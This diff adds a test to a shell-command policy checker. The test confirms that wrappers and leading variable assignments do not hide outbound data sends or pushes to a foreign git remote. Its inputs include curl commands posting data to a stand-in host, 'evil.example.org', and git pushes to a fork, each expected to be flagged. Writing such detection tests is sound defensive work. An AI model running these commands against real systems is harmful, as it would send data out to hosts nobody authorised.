@@ -174,4 +174,20 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     // With nothing foreign named, origin still reads allowed.
     expect(verdictOf('gh pr create --title x')).toEqual({ rule: 'gh-write', verdict: 'allowed', destination: 'github:origin' })
   })
+
+  test('leading assignments are consumed inside the unwrap loop (round 5 R1)', () => {
+    expect(verdictOf('FOO=1 sudo curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+    expect(verdictOf('FOO=1 nohup curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+    expect(verdictOf('FOO=1 bash -c "git push fork"')).toMatchObject({ rule: 'git-push', verdict: 'violation', destination: 'github:other/fork' })
+    // A pinned assignment through a wrapper still reads unresolved.
+    expect(verdictOf('GIT_DIR=/x sudo git push')).toEqual({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:GIT_DIR is set',
+    })
+    // env -C moves the cwd: no repository there, never silent origin.
+    expect(verdictOf('env -C /other git push')).toEqual({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no repository at the cwd',
+    })
+    // An assignment still pins only its own segment when bare.
+    expect(verdictOf('FOO=1 curl -d x https://host.example.org/hook')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+  })
 })
